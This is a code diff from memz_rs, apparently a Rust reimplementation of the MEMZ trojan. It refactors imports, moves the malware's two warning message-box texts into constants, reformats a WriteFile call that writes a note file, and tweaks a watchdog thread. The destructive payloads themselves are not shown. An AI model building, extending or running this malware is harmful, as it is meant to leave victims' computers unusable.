@@ -9,17 +9,16 @@ use memz_rs::{
         callback::{kill_windows, window_proc},
         function::{payload_thread, N_PAYLOADS, PAYLOADS},
     },
-    utils::log::*,
-    utils::log,
+    utils::log::{self, write_log, LogLocation, LogType},
     winapi_type::DWORD,
     wrap_windows_api::*,
-    LMEM_ZEROINIT,
+    LMEM_ZEROINIT, s_v,
 };
 use std::{
     mem::size_of,
     process,
     thread::{self, sleep},
-    time::Duration, ptr,
+    time::Duration,
 };
 use windows::{
     core::PCSTR,
@@ -46,7 +45,7 @@ use windows::{
                 SM_CYSCREEN, SW_SHOWDEFAULT, WINDOW_EX_STYLE, WINDOW_STYLE, WNDCLASSEXA,
             },
         },
-    }, s,
+    },
 };
 
 fn main() -> Result<(), WinError> {
@@ -126,15 +125,8 @@ fn main() -> Result<(), WinError> {
             };
         }
     } else {
-        if wrap_messagebox_a(HWND(0), s!("The software you just executed is considered malware.\r\n\
-        This malware will harm your computer and makes it unusable.\r\n\
-        If you are seeing this message without knowing what you just executed, simply press No and nothing will happen.\r\n\
-        If you know what this malware does and are using a safe environment to test, \
-        press Yes to start it.\r\n\r\n\
-        DO YOU WANT TO EXECUTE THIS MALWARE, RESULTING IN AN UNUSABLE MACHINE?"), "MEMZ", MB_YESNO | MB_ICONWARNING)? != IDYES
-            || wrap_messagebox_a(HWND(0), s!("THIS IS THE LAST WARNING!\r\n\r\n\
-            THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE MADE USING THIS MALWARE!\r\n\
-            STILL EXECUTE IT?"), "MEMZ", MB_YESNO | MB_ICONWARNING)?
+        if wrap_messagebox_a(HWND(0), s_v!(MEMZ_MSGBOXA_1), "MEMZ", MB_YESNO | MB_ICONWARNING)? != IDYES
+            || wrap_messagebox_a(HWND(0), s_v!(MEMZ_MSGBOXA_2), "MEMZ", MB_YESNO | MB_ICONWARNING)?
                 != IDYES
         {
             process::exit(0);
@@ -249,15 +241,7 @@ fn main() -> Result<(), WinError> {
     )
     .unwrap();
 
-    if !unsafe {
-        WriteFile(
-            note,
-            Some(data::msg::MSG.as_bytes()),
-            Some(&mut wb),
-            None,
-        )
-        .as_bool()
-    } {
+    if !unsafe { WriteFile(note, Some(data::msg::MSG.as_bytes()), Some(&mut wb), None).as_bool() } {
         #[cfg(not(feature = "DEBUG_MODE"))]
         eprintln!("Failed WriteFile()\nGetLastError: {:?}", unsafe {
             GetLastError()
@@ -431,7 +415,7 @@ fn watchdog_thread() -> Result<(), WinError> {
             #[cfg(feature = "DEBUG_MODE")]
             {
                 let file = std::str::from_utf8(&proc.szExeFile).unwrap();
-                let file = file.replace("\0", "");
+                let file = file.replace('\0', "");
                 let th32_process_id =
                     format!("Process32Next() proc.th32ProcessID {}", proc.th32ProcessID);
                 let sz_exe_file = format!("Process32Next() proc.szExeFile: {}", file);
